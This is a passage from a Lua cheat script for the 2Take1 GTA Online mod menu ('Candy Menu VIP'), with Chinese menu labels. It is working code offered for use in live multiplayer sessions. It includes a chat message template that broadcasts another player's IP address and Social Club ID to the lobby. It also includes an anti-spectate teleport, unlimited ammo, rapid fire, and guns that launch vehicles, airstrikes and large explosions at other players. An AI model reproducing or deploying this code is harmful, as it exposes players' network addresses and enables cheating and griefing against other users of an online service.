                    if player.is_player_modder(pid,1 << 0x03) or player.is_player_modder(pid,1 << 0x04) or player.is_player_modder(pid,1 << 0x05) or player.is_player_modder(pid,1 << 0x0C) or player.is_player_modder(pid,1 << 0x0D) or player.is_player_modder(pid,1 << 0x0E) then
                        if not _U_hack_list[pid+1] then
                            if not utils.file_exists(utils.get_appdata_path("PopstarDevs", "").."\\2Take1Menu\\scripts\\Candy\\Lua_Settings\\modder.txt") or msg_h=='&name&正在尝试崩溃2TAKE1VIP用户' then
                                msg_h2=player.get_player_name(pid)..'正在崩溃...'
                            else
                                msg_h2=tostring(string.gsub(msg_h,'&name&',player.get_player_name(pid)))
                                msg_h2=tostring(string.gsub(msg_h2,'&ip&',intToIp(player.get_player_ip(pid))))
                                msg_h2=tostring(string.gsub(msg_h2,'&scid&',player.get_player_scid(pid)))
                                msg_h2=tostring(string.gsub(msg_h2,'\\n','\n'))
                                msg_h2=tostring(string.gsub(msg_h2,'&me&',player.get_player_name(player.player_id())))
                                msg_h2=msg_h2..'  --Candy Menu VIP'
                            end
                            network.send_chat_message(msg_h2,false)
                            _U_hack_list[pid+1]=true
                        end
                    end
                end
            end
            user_name_trial_id2=event.add_event_listener("player_join",function(b)
                if b.player==player.player_id() then
                    _U_hack_list={}
                end
            end)
            event.remove_event_listener("player_join",user_name_trial_id2)
        end
    end)	
player_god = {}
veh_god = {}
check_god = menu.add_feature("无敌玩家检测","toggle",a.protoption.id,function(k)
	while k.on do
		for i=0,32 do
			local name = player.get_player_name(i)
			if player.is_player_valid(i) and i ~= player.player_id() then
				if player.is_player_god(i) and player.is_player_playing(i) and interior.get_interior_from_entity(player.get_player_ped(i)) == 0 then
					if not is_include(name,player_god) then
						menu.notify("玩家: "..name.." 是无敌", "Candy Menu VIP", 6, RGBAToInt(0, 255, 0))
						table.insert(player_god,1,name)
					end
				else
				end
				if player.is_player_vehicle_god(i) then
					if not is_include(name,veh_god) then
					    menu.notify("玩家: "..name.." 载具是无敌", "Candy Menu VIP", 6, RGBAToInt(0, 255, 0))
						table.insert(veh_god,1,name)
					end
				else
					if not player.is_player_vehicle_god(i) then
						remove_table(name,veh_god)
					end
				end
			end
		end
		return HANDLER_CONTINUE
	end
	return HANDLER_POP
end)
check_god.on = Settings["check_god"]

_U_fuck_spectater=menu.add_feature("观战者提示","toggle",a.protoption.id,function(a)
	menu.notify("守护模式为开启状态", "Candy Menu VIP", 6, RGBAToInt(0, 255, 0))
        while a.on do
            system.yield(0)
            for pid=0,31 do
                if player.is_player_valid(pid) and player.is_player_spectating(pid) and pid~=player.player_id() then
                    who = player.get_player_name(network.get_player_player_is_spectating(pid))
                    if who then
                        who_spec=player.get_player_name(pid)
                        ui.draw_rect(0.001, 0.999, 4.5, 0.085, 0, 0, 0, 0)
                        ui.set_text_color(255, 255, 255, 255)	
                        ui.set_text_scale(0.4)
                        ui.set_text_font(0)
                        ui.set_text_centre(true)
                        ui.set_text_outline(true)
                        ui.draw_text(who_spec.." 正在观看 "..who,v2(0.5,0.96))
                    end
                end
            end
        end
    end)	
_U_fuck_spectater.on = Settings["_U_fuck_spectater"]	

Who_looking = menu.add_feature("偷窥者提示", "toggle", a.protoption.id, function(feat) 
	if feat.on then
		local pos = v2()
		pos.x = 0.01
		pos.y = .03
		for i = 0, 32 do
			if player.is_player_spectating(i) and player.is_player_playing(i) 
			and interior.get_interior_from_entity(player.get_player_ped(i)) == 0 then
				local name = player.get_player_name(i)
				local to_player = network.get_player_player_is_spectating(i)
				local to_name = player.get_player_name(to_player)
				pos.y = pos.y + 0.08
				ui.set_text_scale(0.30)
				ui.set_text_font(0)
				ui.set_text_color(0, 255, 255, 255)
				ui.set_text_centre(false)
				ui.set_text_outline(true)
				ui.draw_text(name.." 正在观战 "..(i == to_player and "你" or to_name), pos)
			end
		end
		return HANDLER_CONTINUE
	end
	return HANDLER_POP

end)
Who_looking.on = Settings["Who_looking"]

_U_Anti_spectater=menu.add_feature("阻止观战玩家","toggle",a.protoption.id,function(a)
	menu.notify("不允许他观战你的视角", "Candy Menu VIP", 6, RGBAToInt(0, 255, 0))
        local me=player.player_id()
        local last_pos=player.get_player_coords(me)
        while a.on do
            system.yield(0)
            local me=player.player_id()
            local my_ped=player.get_player_ped(me)
            local last_pos=player.get_player_coords(me)
            if a.on then
                for pid=0,31 do
                    if player.is_player_valid(pid) and player.is_player_spectating(pid) and pid~=player.player_id() then
                        if network.get_player_player_is_spectating(pid)==player.player_id() then
                            local last_pos=player.get_player_coords(player.player_id())
                            while player.is_player_valid(pid) and player.is_player_spectating(pid) and network.get_player_player_is_spectating(pid)==player.player_id() do
                                if player.is_player_valid(pid) and player.is_player_spectating(pid) and network.get_player_player_is_spectating(pid)==player.player_id()then
                                system.yield(0)
                                entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()),player.get_player_coords(pid))
                                entity.set_entity_visible(player.get_player_ped(player.player_id()),false)
                                else
                                entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()),last_pos)
                                entity.set_entity_visible(player.get_player_ped(player.player_id()),true)
                                end
                            end
                        end
                    end
                end
            else
                entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()),last_pos)
                entity.set_entity_visible(player.get_player_ped(player.player_id()),true)
            end
        end
    end)
_U_Anti_spectater.on = Settings["_U_Anti_spectater"]	
	
jcewudi = menu.add_feature("无敌玩家标记", "toggle", a.protoption.id, function(feat) 
		if feat.on then
		Settings["wudijiance"] = true
		local me
		me = player.player_id()
		for i = 0, 32 do
		local ped_god = player.is_player_god(i)
		local fnd = player.is_player_friend(i)
		if i ~= me and ped_god and not player.is_player_modder(i, -1) then
		player.set_player_as_modder(i, 1)
		end
		if not ped_god then
		player.unset_player_as_modder(i, -1)
		end
		end
		return HANDLER_CONTINUE
		else
		Settings["wudijiance"] = false
		end
		return HANDLER_POP
	end)
jcewudi.on = Settings["wudijiance"]	


position = {"前","后","左","右","上","下"}
delivery_q = menu.add_feature("方向传送", "parent", a.teleport.id)
local delivery_q_l = {}
for i = 1 , #position do
	delivery_q_l[i] = menu.add_feature("向"..position[i].."传送","action",delivery_q.id,function() 
		pos = player.get_player_coords(player.player_id())
		head = player.get_player_heading(player.player_id())		
		if (i == 1) 
		then
			head = math.rad((head - 180) * -1)
			pos.x = pos.x + math.sin(head) * -5
			pos.y = pos.y + math.cos(head) * -5
		elseif (i == 2) 
		then
			head = math.rad((head - 360) * -1)
			pos.x = pos.x + math.sin(head) * -5
			pos.y = pos.y + math.cos(head) * -5
		elseif (i == 3) 
		then
			head = math.rad((head - 90) * -1)
			pos.x = pos.x + math.sin(head) * -5
			pos.y = pos.y + math.cos(head) * -5
		elseif (i == 4) 
		then
			head = math.rad((head + 90) * -1)
			pos.x = pos.x + math.sin(head) * -5
			pos.y = pos.y + math.cos(head) * -5
		elseif (i == 5) 
		then	
			pos.z = pos.z + 5
		elseif (i == 6) 
		then
			pos.z = pos.z - 5
		end	
		entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()), pos)
	end)
end

delivery_c = menu.add_feature("保存传送", "parent", a.teleport.id)
posslis = {}
aaa = menu.add_feature("保存当前坐标", "action", delivery_c.id, function(feat)
	local mypos = player.get_player_coords(player.player_id())
	for i = 1,50 do
		if posslis[i] == nil then
			posslis[i] = mypos 
			break
		end
	end
end)

poslist = {}
poslists = {}
for posid = 1,50 do
	local features = {} 
	poslist[posid] = menu.add_feature("坐标 " .. posid, "action_value_str", delivery_c.id, function(ff)
		if ff.value == 0 then
			entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()), posslis[posid])
		elseif ff.value == 1 then
			posslis[posid] = nil
		end
		
    end)
	poslist[posid]:set_str_data({"传送","删除"})
	poslists[posid] = {
		feat = poslist[posid],
		features = features
	}
end

local ofor = menu.add_feature("Loop", "toggle", 0, function(ff)
	if ff.on then
		for posid = 1,50 do
			local poss = poslists[posid]
			local f = poss.feat
			if posslis[posid] ~= nil then
				 if f.hidden then f.hidden = false end
			else
				if not f.hidden then
					f.hidden = true
				end
			end
		end
	return HANDLER_CONTINUE
	end	
end)
ofor.hidden = true
ofor.on = true


_U_xyz_delay=menu.add_feature('delay','toggle', delivery_c.id,function(a)
        _U_tp_xyz.on=false
        system.yield(1000)
        _U_tp_xyz.on=true
        a.on=false
    end
)

_U_xyz_delay.hidden=true
_U_Coustm_xyz=menu.add_feature('坐标设定','parent',delivery_c.id)
_U_Coustm_x=menu.add_feature('X','autoaction_value_f',
    _U_Coustm_xyz.id,
    function(a)
        _U_xyz_delay.on=true
        local pos=player.get_player_coords(player.player_id())
        entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()),v3(a.value,pos.y,pos.z))
    end
)
_U_Coustm_y=menu.add_feature('Y','autoaction_value_f',_U_Coustm_xyz.id,
    function(a)
        _U_xyz_delay.on=true
        local pos=player.get_player_coords(player.player_id())
        entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()),v3(pos.x,a.value,pos.z))
    end
)
_U_Coustm_z=menu.add_feature('显示高度位置','autoaction_value_f',_U_Coustm_xyz.id,function(a)
        _U_xyz_delay.on=true
        local pos=player.get_player_coords(player.player_id())
        entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()),v3(pos.x,pos.y,a.value))
    end
)
_U_Coustm_z.max,_U_Coustm_x.max,_U_Coustm_y.max=2147483647,2147483647,2147483647
_U_Coustm_z.min,_U_Coustm_x.min,_U_Coustm_y.min=-2147483648,-2147483648,-2147483648
_U_Coustm_z.mod,_U_Coustm_x.mod,_U_Coustm_y.mod=1,1,1
_U_tp_xyz=menu.add_feature('循环','toggle',_U_Coustm_xyz.id,function(a)
        while a.on do
            system.yield(10)
            local pos=player.get_player_coords(player.player_id())
            _U_Coustm_x.value=pos.x
            _U_Coustm_y.value=pos.y
            _U_Coustm_z.value=pos.z
        end
    end
)

_U_tp_xyz.hidden=true
_U_tp_xyz.on=true
	
address_pos = {
	{Name = "国际机场", X = -1332.953, Y = -3040.490, Z = 13.944},
	{Name = "赌场", X = 916.878, Y = 51.610, Z = 80.899},
	{Name = "改装王", X = 710.641, Y = -1088.179, Z = 22.416},
	{Name = "理发店", X = 130.812, Y = -1714.609, Z = 29.248},
	{Name = "宾客服装", X = -815.304, Y = -1085.820, Z = 10.988},
	{Name = "精品服装", X = -152.114, Y = -307.179, Z = 38.665},
	{Name = "酒吧", X = 132.885, Y = -1305.837, Z = 29.165},
	{Name = "武装国度", X = 15.737, Y = -1119.100, Z = 28.824},
	{Name = "纹身店", X = 320.261, Y = 175.599, Z = 103.697},
	{Name = "理发师", X = -1291.518, Y = -1116.755, Z = 6.6637},
	{Name = "面具店", X = -1339.490, Y = -1279.563, Z = 4.862},
	{Name = "商店", X = 29.098, Y = -1351.540, Z = 29.337},
	{Name = "办公室楼顶", X = -75.392, Y = -819.270, Z = 326.175},
	{Name = "夜店", X = 132.885, Y = -1305.837, Z = 29.165},
	{Name = "沙滩海岸机场", X = 1747.000, Y = 3273.000, Z = 41.163},
	{Name = "C山顶部", X = 489.979, Y = 5587.527, Z = 794.079},
	{Name = "荣恩风力发电厂", X = 2183.316, Y = 1804.355, Z = 107.152},
	{Name = "洗车地", X = -699.700, Y = -922.900, Z = 19.007},
	{Name = "军事基地", X = -2033.553, Y = 3077.005, Z = 32.810}
}

delivery_d = menu.add_feature("地址传送", "parent", a.teleport.id)
local delivery_d_l = {}
for i = 1 , #address_pos do
	delivery_d_l[i] = menu.add_feature(address_pos[i]["Name"],"action",delivery_d.id,function() 
		entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()), v3(address_pos[i]["X"],address_pos[i]["Y"], address_pos[i]["Z"]))
	end)
end

cloths = menu.add_feature("人物选项","parent",a.seplayer.id,function(feat)
end)

npcchange =menu.add_feature("人物模型","parent",cloths.id,function(feat)
end)

commonmodelchangerlist = {
    {"莱斯特", "2013139108"},
    {"富兰克林", "2602752943"},
    {"崔佛", "-1686040670"},
    {"埃万重甲", "2431602996"},
    {"太空人", "3887273010"},
    {"宇航员", "-407694286"},
	{"胖子", "1004114196"},
	{"医疗护理", "-1286380898"},
	{"大猴子", "-598109171"},
	{"FIB", "2072724299"},
	{"消防员", "-1229853272"},
	{"公路警察", "1939545845"},
	{"公路警察2", "1456041926"},
	{"警察女", "368603149"},
	{"警察男", "1581098148"},
	{"警察男1", "2141384740"},
	{"警察男2", "666086773"},
	{"囚犯", "2073775040"},
	{"海军人员1", "-220552467"},
	{"海军人员2", "1702441027"},
	{"海军人员3", "1925237458"},
	{"黑色行动", "2047212121"},
	{"装甲人员1", "-1782092083"},
	{"装甲人员2", "1669696074"},
	{"肌肉男", "-636391810"},
	{"海军陆战队", "1490458366"},
	{"超人", "880829941"},
	{"邪教男", "1413662315"},
	{"耶稣", "-835930287"},
	{"小丑", "71929310"},
	{"SWAT", "-1920001264"}
}
for i = 1, #commonmodelchangerlist do
	menu.add_feature(commonmodelchangerlist[i][1],"action",npcchange.id,function()
		modelchange(commonmodelchangerlist[i][2])
	end)
end

animalchange =menu.add_feature("动物模型","parent",cloths.id,function(feat)
end)

commonmodelchangerlist1 = {
    {"野猪", "-832573324"},
    {"鲨鱼", "113504370"},
    {"金毛", "882848737"},
    {"斗牛犬", "1832265812"},
    {"老鼠", "-1011537562"},
    {"兔子", "-541762431"},
	{"贵宾犬", "1125994524"},
	{"豹子", "307287994"},
	{"鸡", "1794449327"},
	{"牛", "-50684386"},
	{"狼", "1682622302"},
	{"鱼", "802685111"},
	{"某生物", "1457690978"},
	{"猫", "1462895032"},
	{"鲸", "-1920284487"},
	{"鹰", "-1430839454"},
	{"鹿", "-664053099"}
}
for i = 1, #commonmodelchangerlist1 do
	menu.add_feature(commonmodelchangerlist1[i][1],"action",animalchange.id,function()
		modelchange(commonmodelchangerlist1[i][2])
	end)
end

menu.add_feature("犀牛","action",cloths.id,function()
        if player.get_player_model(player.player_id()) ~= 2627665880 then
        modelchange(gameplay.get_hash_key("mp_f_freemode_01"))
        end
        ped.set_ped_component_variation(player.get_player_ped(player.player_id()), 0, 0, 0, 0)
        ped.set_ped_component_variation(player.get_player_ped(player.player_id()), 1, 91, 0, 0)
        ped.set_ped_component_variation(player.get_player_ped(player.player_id()), 11, 300, 4, 4)
        ped.set_ped_component_variation(player.get_player_ped(player.player_id()), 2, 42, 0, 0)
        ped.set_ped_component_variation(player.get_player_ped(player.player_id()), 3, 8, 0, 0)
        ped.set_ped_component_variation(player.get_player_ped(player.player_id()), 4, 86, 4, 4)
        ped.set_ped_component_variation(player.get_player_ped(player.player_id()), 6, 58, 0, 0)
        ped.set_ped_component_variation(player.get_player_ped(player.player_id()), 7, 0, 0, 0)
        ped.set_ped_component_variation(player.get_player_ped(player.player_id()), 8, 105, 0, 0)
        ped.set_ped_component_variation(player.get_player_ped(player.player_id()), 5, 0, 0, 0)
        ped.set_ped_component_variation(player.get_player_ped(player.player_id()), 10, 0, 0, 0)
        ped.set_ped_component_variation(player.get_player_ped(player.player_id()), 9, 0, 0, 0)
        ped.set_ped_prop_index(player.get_player_ped(player.player_id()), 0, -1, -1, 0)
        ped.set_ped_prop_index(player.get_player_ped(player.player_id()), 1, 24, 9, 0)
        ped.set_ped_prop_index(player.get_player_ped(player.player_id()), 2, 6, -1, 0)
        ped.set_ped_prop_index(player.get_player_ped(player.player_id()), 3, -1, 0, 0)
        ped.set_ped_prop_index(player.get_player_ped(player.player_id()), 4, -1, -1, 0)
        ped.set_ped_prop_index(player.get_player_ped(player.player_id()), 5, -1, -1, 0)
        ped.set_ped_prop_index(player.get_player_ped(player.player_id()), 6, -1, -1, 0)
        ped.set_ped_prop_index(player.get_player_ped(player.player_id()), 7, -1, -1, 0)
        ped.set_ped_prop_index(player.get_player_ped(player.player_id()), 8, -1, -1, 0)
        ped.set_ped_prop_index(player.get_player_ped(player.player_id()), 9, -1, -1, 0)
    end
)
menu.add_feature("警服","action",cloths.id,function()
    local component = {{0, 0},{0, 6},{0, 14},{0, 34},{0, 0},{0, 25},{0, 0},{0, 35},{0, 0},{0, 0},{0, 48}}
    local prop = {{0, 45, 0},{1, 11, 0},{2, 4294967295, 0},{6, 4294967295, -1},{7, 4294967295, -1}}
        if player.get_player_model(player.player_id()) ~= 2627665880 then
           modelchange(gameplay.get_hash_key("mp_f_freemode_01"))
        end
        for i = 1, #component do
            ped.set_ped_component_variation(player.get_player_ped(player.player_id()), i, component[i][2], component[i][1], 2)
        end
        for i = 1, #prop do
            ped.set_ped_prop_index(player.get_player_ped(player.player_id()), prop[i][1], prop[i][2], prop[i][3], 0)
        end
    end
)

wuqi111 = menu.add_feature("武器选项","parent",a.seplayer.id,function(feat)
end)

wuqi1give = c.df("给予所有武器", "action",wuqi111.id, function()
for i, weapon_hash in pairs(weapon.get_all_weapon_hashes()) do
weapon.give_delayed_weapon_to_ped(player.get_player_ped(player.player_id()), weapon_hash, 0, 0)
end
end)
local YUZHOUSHENCROSS = menu.add_feature("AN_get_aim_function","toggle",0,function(a)
if a.on then
ui.show_hud_component_this_frame(14)
return HANDLER_CONTINUE
end
return HANDLER_POP
end)
YUZHOUSHENCROSS.hidden=true

KuaiSuKaiHuo=menu.add_feature("快速射击","toggle",wuqi111.id,function(a)
        while a.on do
		Settings["kaiqikuaisusheji"] = true
            local me=player.player_id()
            local my_ped=player.get_player_ped(me)
            system.yield(0)
            if controls.get_control_normal(0,142)==0.0 then
                state=nil
            else
                state=1
            end
            while state do
            local v3_start = player.get_player_coords(me)
            local dir = cam.get_gameplay_cam_rot()
            dir:transformRotToDir()
            local v3_start = v3_start + dir*v3(1.5,1.5,1.5)+v3(0,0,0.4)
            local v3_end = v3_start + dir* v3(1500,1500,1500)+v3(0,0,0.4)
            local hash_weapon = ped.get_current_ped_weapon(player.get_player_ped(player.player_id()))
            gameplay.shoot_single_bullet_between_coords(v3_start, v3_end, 1, hash_weapon, my_ped, true, false, 1000)
            system.yield(0)
            return HANDLER_CONTINUE
            end
        end
		Settings["kaiqikuaisusheji"] = false
    end)
KuaiSuKaiHuo.on = Settings["kaiqikuaisusheji"]

auto_refill_ammo = menu.add_feature('无限弹药', 'toggle', wuqi111.id, function(feat)
	if feat.on then
	Settings["AutoRefillAmmo"] = true
		for i, weapon_hash in pairs(weapon.get_all_weapon_hashes()) do
			boammo,maxammo = weapon.get_max_ammo(player.get_player_ped(player.player_id()),weapon_hash)
			weapon.set_ped_ammo(player.get_player_ped(player.player_id()),weapon_hash,maxammo)
		end
		return HANDLER_CONTINUE
	end
	Settings["AutoRefillAmmo"] = false
end)
auto_refill_ammo.on = Settings["AutoRefillAmmo"]

vehicle_arms1 = menu.add_feature("斜面魔宝枪", "toggle", wuqi111.id, function(feat)
	local pedmy = player.get_player_ped(player.player_id())
	if feat.on then
		local pos = player.get_player_coords(player.player_id())
		head = player.get_player_heading(player.player_id())
		head1 = math.rad((head - 180) * -1)
		pos.x = pos.x + math.sin(head1) * -10
		pos.y = pos.y + math.cos(head1) * -10
		z = cam.get_gameplay_cam_rot().x 
		if z > 0.00 then z = z / 6 else z = z / 6 end 
		pos.z = pos.z + z
		if ped.is_ped_shooting(pedmy) then
		local dir=cam.get_gameplay_cam_rot()
        dir:transformRotToDir()
        dir=v3(dir.x*15,dir.y*15,dir.z*15)    
		local car = spawn_vehicle(-827162039,pos,head)
		entity.set_entity_coords_no_offset(car,player.get_player_coords(player.player_id())+dir)
		entity.set_entity_rotation(car,cam.get_gameplay_cam_rot())
		vehicle.set_vehicle_forward_speed(car,1000)
		entity.set_entity_as_no_longer_needed(car)
		entity.set_entity_god_mode(car, true)
		end
		return HANDLER_CONTINUE
	end
end)
vehicle_arms1.on = Settings["vehicle_arms1"]

vehicle_arms2 = menu.add_feature("随机载具枪", "toggle", wuqi111.id, function(feat)
	local pedmy = player.get_player_ped(player.player_id())
	if feat.on then
		local pos = player.get_player_coords(player.player_id())
		head = player.get_player_heading(player.player_id())
		head1 = math.rad((head - 180) * -1)
		pos.x = pos.x + math.sin(head1) * -15
		pos.y = pos.y + math.cos(head1) * -15
		z = math.abs(cam.get_gameplay_cam_rot().x) / 10
		z = math.floor(z)
		pos.z = pos.z + z
		if ped.is_ped_shooting(pedmy) then
        local dir=cam.get_gameplay_cam_rot()
        dir:transformRotToDir()
        dir=v3(dir.x*15,dir.y*15,dir.z*15)
		local car = spawn_vehicle(V_a[math.random(1,#V_a)],pos,head)
        entity.set_entity_coords_no_offset(car,player.get_player_coords(player.player_id())+dir)
		entity.set_entity_rotation(car,cam.get_gameplay_cam_rot())
		vehicle.set_vehicle_forward_speed(car,1000)
		entity.set_entity_as_no_longer_needed(car)
		entity.set_entity_god_mode(car, true)
		end
		return HANDLER_CONTINUE
	end
end)
vehicle_arms2.on = Settings["vehicle_arms2"]

vehicle_arms3 = menu.add_feature("推土机枪", "toggle", wuqi111.id, function(feat)
	local pedmy = player.get_player_ped(player.player_id())
	if feat.on then
		local pos = player.get_player_coords(player.player_id())
		head = player.get_player_heading(player.player_id())
		head1 = math.rad((head - 180) * -1)
		pos.x = pos.x + math.sin(head1) * -10
		pos.y = pos.y + math.cos(head1) * -10
		z = cam.get_gameplay_cam_rot().x 
		if z > 0.00 then z = z / 6 else z = z / 6 end 
		pos.z = pos.z + z
		if ped.is_ped_shooting(pedmy) then
		local dir=cam.get_gameplay_cam_rot()
        dir:transformRotToDir()
        dir=v3(dir.x*15,dir.y*15,dir.z*15)    
		local car = spawn_vehicle(1886712733,pos,head)
		entity.set_entity_coords_no_offset(car,player.get_player_coords(player.player_id())+dir)
		entity.set_entity_rotation(car,cam.get_gameplay_cam_rot())
		vehicle.set_vehicle_forward_speed(car,1000)
		entity.set_entity_as_no_longer_needed(car)
		entity.set_entity_god_mode(car, true)
		end
		return HANDLER_CONTINUE
	end
end)
vehicle_arms3.on = Settings["vehicle_arms3"]

vehicle_arms4 = menu.add_feature("矿石搬运车枪", "toggle", wuqi111.id, function(feat)
	local pedmy = player.get_player_ped(player.player_id())
	if feat.on then
		local pos = player.get_player_coords(player.player_id())
		head = player.get_player_heading(player.player_id())
		head1 = math.rad((head - 180) * -1)
		pos.x = pos.x + math.sin(head1) * -10
		pos.y = pos.y + math.cos(head1) * -10
		z = cam.get_gameplay_cam_rot().x 
		if z > 0.00 then z = z / 6 else z = z / 6 end 
		pos.z = pos.z + z
		if ped.is_ped_shooting(pedmy) then
		local dir=cam.get_gameplay_cam_rot()
        dir:transformRotToDir()
        dir=v3(dir.x*15,dir.y*15,dir.z*15)    
		local car = spawn_vehicle(-2130482718,pos,head)
		entity.set_entity_coords_no_offset(car,player.get_player_coords(player.player_id())+dir)
		entity.set_entity_rotation(car,cam.get_gameplay_cam_rot())
		vehicle.set_vehicle_forward_speed(car,1000)
		entity.set_entity_as_no_longer_needed(car)
		entity.set_entity_god_mode(car, true)
		end
		return HANDLER_CONTINUE
	end
end)
vehicle_arms4.on = Settings["vehicle_arms4"]

vehicle_arms5 = menu.add_feature("油罐车拖车枪", "toggle", wuqi111.id, function(feat)
	local pedmy = player.get_player_ped(player.player_id())
	if feat.on then
		local pos = player.get_player_coords(player.player_id())
		head = player.get_player_heading(player.player_id())
		head1 = math.rad((head - 180) * -1)
		pos.x = pos.x + math.sin(head1) * -10
		pos.y = pos.y + math.cos(head1) * -10
		z = cam.get_gameplay_cam_rot().x 
		if z > 0.00 then z = z / 6 else z = z / 6 end 
		pos.z = pos.z + z
		if ped.is_ped_shooting(pedmy) then
		local dir=cam.get_gameplay_cam_rot()
        dir:transformRotToDir()
        dir=v3(dir.x*15,dir.y*15,dir.z*15)    
		local car = spawn_vehicle(-730904777,pos,head)
		entity.set_entity_coords_no_offset(car,player.get_player_coords(player.player_id())+dir)
		entity.set_entity_rotation(car,cam.get_gameplay_cam_rot())
		vehicle.set_vehicle_forward_speed(car,1000)
		entity.set_entity_as_no_longer_needed(car)
		entity.set_entity_god_mode(car, true)
		end
		return HANDLER_CONTINUE
	end
end)
vehicle_arms5.on = Settings["vehicle_arms5"]

vehicle_arms6 = menu.add_feature("大型运输机枪", "toggle", wuqi111.id, function(feat)
	local pedmy = player.get_player_ped(player.player_id())
	if feat.on then
		local pos = player.get_player_coords(player.player_id())
		head = player.get_player_heading(player.player_id())
		head1 = math.rad((head - 180) * -1)
		pos.x = pos.x + math.sin(head1) * -10
		pos.y = pos.y + math.cos(head1) * -10
		z = cam.get_gameplay_cam_rot().x 
		if z > 0.00 then z = z / 6 else z = z / 6 end 
		pos.z = pos.z + z
		if ped.is_ped_shooting(pedmy) then
		local dir=cam.get_gameplay_cam_rot()
        dir:transformRotToDir()
        dir=v3(dir.x*15,dir.y*15,dir.z*15)    
		local car = spawn_vehicle(368211810,pos,head)
		entity.set_entity_coords_no_offset(car,player.get_player_coords(player.player_id())+dir)
		entity.set_entity_rotation(car,cam.get_gameplay_cam_rot())
		vehicle.set_vehicle_forward_speed(car,1000)
		entity.set_entity_as_no_longer_needed(car)
		entity.set_entity_god_mode(car, true)
		end
		return HANDLER_CONTINUE
	end
end)
vehicle_arms6.on = Settings["vehicle_arms6"]

_U_main_weapon_color=menu.add_feature("武器变色","toggle",wuqi111.id,function(a)
while a.on do
Settings["colorqiang"] = true
for i, weapon_hash in pairs(weapon.get_all_weapon_hashes()) do
if weapon.has_ped_got_weapon(player.get_player_ped(player.player_id()), weapon_hash) then
local number_of_tints = weapon.get_weapon_tint_count(weapon_hash)
if weapon_hash and weapon_hash ~= 2725352035 and number_of_tints > 0 then
weapon.set_ped_weapon_tint_index(player.get_player_ped(player.player_id()), weapon_hash, math.random(1, number_of_tints))
end
end
end
c.wait(50)
end
Settings["colorqiang"] = false
end)
_U_main_weapon_color.on = Settings["colorqiang"]

airstike_gun = menu.add_feature("空袭枪", "toggle",wuqi111.id, function(f)
local hash, pedmy, P = gameplay.get_hash_key("weapon_airstrike_rocket"),player.get_player_ped(c.me()), v3(0, 0, 15)
while f.on do
Settings["kongxiqiang"] = true
local m = c.me()
if f.on and ped.is_ped_shooting(pedmy) then
local Pos, d = get_collision_vector(m, pedmy)
if d > 3 then
gameplay.shoot_single_bullet_between_coords(Pos + P, Pos, 1000, hash, pedmy, true, false, 250)
end
end
c.wait(0)
end
Settings["kongxiqiang"] = false
end)
airstike_gun.on = Settings["kongxiqiang"]

asteroids_gun = menu.add_feature("陨石生成枪", "toggle",wuqi111.id, function(f)
local hash, pedmy, P = gameplay.get_hash_key("weapon_airstrike_rocket"),player.get_player_ped(c.me()), v3(0, 0, 15)
while f.on do
Settings["yunshiqiang"] = true
local m = c.me()
if f.on and ped.is_ped_shooting(pedmy) then
local pos, d = get_collision_vector(m, pedmy)
if d > 3 then
object.create_object(3751297495, pos, true, true)
end
end
c.wait(0)
end
Settings["yunshiqiang"] = false
end)
asteroids_gun.on = Settings["yunshiqiang"]

shark_gun = menu.add_feature("鲨鱼枪", "toggle",wuqi111.id, function(f)
	local pedmy, P =  player.get_player_ped(c.me()), v3(0, 0, 15)
	while f.on do
		Settings["shayuqiang"] = true
		local m = c.me()
		if f.on and ped.is_ped_shooting(pedmy) then
			local pos, d = get_collision_vector(m, pedmy)
			if d > 3 then
				pedp = player.get_player_ped(c.me())
				NPC = Cped(26,0x06C3F072, pos , 0)
				entity.freeze_entity(NPC, true)
				entity.set_entity_rotation(NPC, v3(90, 0, 0))
				fire.add_explosion(pos, 4, false, false, 1.0, pedp)
				fire.add_explosion(pos, 13, true, false, 0, pedp)
			end
		end
		c.wait(0)
	end
	Settings["shayuqiang"] = false
end)
shark_gun.on = Settings["shayuqiang"]

atomizer_gun = menu.add_feature("原子子弹", "toggle",wuqi111.id, function(f)
local pedmy, P =  player.get_player_ped(c.me()), v3(0, 0, 15)
while f.on do
Settings["yuanzinengzidan"] = true
local m = c.me()
if f.on and ped.is_ped_shooting(pedmy) then
local pos, d = get_collision_vector(m, pedmy)
if d > 3 then
fire.add_explosion(pos, 70, true, false, 0, pedmy)
end
end
c.wait(0)
end
Settings["yuanzinengzidan"] = false
end)
atomizer_gun.on = Settings["yuanzinengzidan"]

local apocalypse_gun =menu.add_feature("爆炸子弹","toggle",wuqi111.id,function(f)
local we, Ped, P = gameplay.get_hash_key("weapon_rpg"), player.get_player_ped(player.player_id()), v3(0, 0, 0)
while f.on do
Settings["apocalypse_gun1"] = true
local m = player.player_id()
if f.on and ped.is_ped_shooting(Ped) then
local Pos, d = get_collision_vector(m, Ped)
if d > 3 then
gameplay.shoot_single_bullet_between_coords(Pos + P, Pos, 999999, we, Ped, true, false, 99999)
end
end
c.wait(0)
end
Settings["apocalypse_gun1"] = false
end)
apocalypse_gun.on = Settings["apocalypse_gun1"]


firework_gun = menu.add_feature("烟花枪","toggle",wuqi111.id,function(a)
        while a.on do
          Settings["yanhuaqiang"] = true
            local me=player.player_id()
            local my_ped=player.get_player_ped(me)
            c.wait(0)
            while ped.is_ped_shooting(my_ped) do
            local pos1=player.get_player_coords(me)
            local pos2 = player.get_player_coords(me)
            dir = cam.get_gameplay_cam_rot()
            dir:transformRotToDir()
            dir = dir*v3(30,30,30)
            pos1 = pos1 + dir
            dir = dir*v3(60,60,60)
            pos2 = pos2 + dir
            gameplay.shoot_single_bullet_between_coords(pos1,pos2, 1, 2138347493, my_ped, false, false, 2000)
            c.wait(0)
            return HANDLER_CONTINUE
          end
        end
    Settings["yanhuaqiang"] = false
end)

firework_gun.on = Settings["yanhuaqiang"]

firework_gun = menu.add_feature("导弹枪","toggle",wuqi111.id,function(a)
        while a.on do
          Settings["yanhuaqiang3"] = true
            local me=player.player_id()
            local my_ped=player.get_player_ped(me)
            c.wait(0)
            while ped.is_ped_shooting(my_ped) do
            local pos1=player.get_player_coords(me)
            local pos2 = player.get_player_coords(me)
            dir = cam.get_gameplay_cam_rot()
